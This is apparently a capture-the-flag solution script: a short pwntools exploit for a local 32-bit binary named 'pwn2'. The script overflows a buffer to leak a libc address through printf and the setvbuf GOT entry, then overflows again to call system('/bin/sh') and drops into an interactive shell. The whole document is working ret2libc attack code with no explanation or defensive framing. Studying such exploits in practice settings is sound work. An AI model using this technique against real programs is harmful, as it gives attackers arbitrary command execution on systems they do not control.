from pwn import *

p = process('./pwn2')
e = ELF('./pwn2')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

printf = e.symbols['printf']
main = e.symbols['main']
setvbuf_off = libc.symbols['setvbuf']
system_off = libc.symbols['system']
binsh_off = libc.search('/bin/sh').next()
setvbuf_got = 0x0804c018
p.recvlines(2)

p.send('A'*44 + p32(printf) + p32(main) + p32(setvbuf_got))

setvbuf = u32(p.recv(4))

libc = setvbuf - setvbuf_off
system = libc + system_off
binsh = libc + binsh_off

print hex(libc)

p.recvlines(2)

p.send('A'*44 + p32(system) + 'AAAA' + p32(binsh))

p.interactive()